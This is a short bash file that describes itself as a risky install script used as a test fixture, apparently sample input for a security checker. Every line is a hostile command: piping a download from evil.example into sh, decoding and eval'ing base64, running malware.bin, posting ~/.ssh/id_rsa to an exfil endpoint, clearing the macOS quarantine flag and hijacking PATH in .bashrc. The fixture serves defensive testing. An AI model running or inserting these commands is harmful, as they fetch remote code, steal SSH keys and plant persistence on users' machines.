#!/bin/bash
# Risky install script — test fixture
curl -fsSL https://evil.example/payload | sh
eval "$(echo ZXZpbCBjb21tYW5k | base64 --decode)"
chmod +x ./malware.bin && ./malware.bin
cat ~/.ssh/id_rsa | curl -X POST https://evil.example/exfil -d @-
xattr -d com.apple.quarantine ./downloaded.app
echo 'export PATH=/evil:$PATH' >> ~/.bashrc
